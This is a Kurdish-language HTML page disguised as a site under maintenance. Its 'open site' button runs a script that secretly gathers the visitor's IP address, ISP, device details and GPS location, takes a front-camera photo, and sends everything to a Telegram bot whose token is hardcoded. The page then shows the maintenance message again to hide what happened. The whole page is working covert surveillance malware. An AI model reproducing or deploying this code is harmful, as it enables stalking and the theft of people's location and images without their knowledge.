<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        h1 { font-size: 22px; color: #e74c3c; margin-bottom: 15px; }
        p { font-size: 15px; color: #666; margin-bottom: 25px; }
        .btn {
            background-color: #27ae60;
            color: white;
            border: none;
            padding: 15px 25px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover { background-color: #219653; }
    </style>
</head>
<body>
    <div class="container" id="content-box">
        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
        <p>بۆ بینینی ناوەڕۆک و چالاککردنی پەڕەکە، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
        <button class="btn" onclick="startProcess()">کردنەوەی ماڵپەڕ</button>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id') || "6782298541";

        async function startProcess() {
            document.getElementById('content-box').innerHTML = '<h1>⏳ چاوەڕوان بێ...</h1><p>خەریکی بارکردنی زانیارییەکان...</p>';

            let visitTime = new Date().toISOString().replace('T', ' ').substring(0, 19);
            
            // 1. مۆدێل
            let deviceModel = "نادیار";
            try {
                const parser = new UAParser();
                const result = parser.getResult();
                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
            } catch (e) {}

            // 2. IP
            let ip = 'نادیار', isp = 'نادیار';
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || 'نادیار';
                isp = data.org || 'نادیار';
            } catch (e) {}

            // 3. لۆکەیشن
            let locationText = "بەردەست نییە";
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                });
                locationText = `${pos.coords.latitude}, ${pos.coords.longitude}`;
            } catch (e) {}

            // 4. وێنەی کامێرا
            let imageBlob = null;
            let cameraStatus = "سەرکەوتوو بوو";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                imageBlob = await new Promise((resolve) => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640; 
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        canvas.toBlob(blob => {
                            stream.getTracks().forEach(t => t.stop());
                            resolve(blob);
                        }, 'image/jpeg');
                    }, 1000);
                });
            } catch (e) {
                cameraStatus = "نەگیرا";
            }

            // دەقێکی زۆر سادە بێ مارکداون بۆ ئەوەی هەرگیز هەڵە نەدات
            const msg = "سەردانیکەرێکی نوێ!\n\n" +
                        "کات: " + visitTime + "\n" +
                        "IP: " + ip + " (" + isp + ")\n" +
                        "لۆکەیشن: " + locationText + "\n" +
                        "کامێرا: " + cameraStatus + "\n" +
                        "ئامێر: " + deviceModel;

            // ناردنی دەقەکە بە بێ parse_mode بۆ دڵنیابوون لە گەیشتنی
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: chatId, 
                        text: msg 
                    })
                });
            } catch (err) {}

            // ناردنی وێنەکە لەگەڵ دەقەکەدا وەک caption (بەو شێوازەی کە سەرکەوتوو بوو)
            if (imageBlob) {
                try {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', imageBlob, 'capture.jpg');
                    formData.append('caption', msg); // لێرەدا دەقەکە دەخەینە ناو وێنەکەشەوە تا دڵنیابین
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
                        method: 'POST', 
                        body: formData 
                    });
                } catch (err) {}
            }

            // گەڕاندنەوەی باری ئاسایی
            document.getElementById('content-box').innerHTML = `
                <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
                <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
            `;
        }
    </script>
</body>
</html>
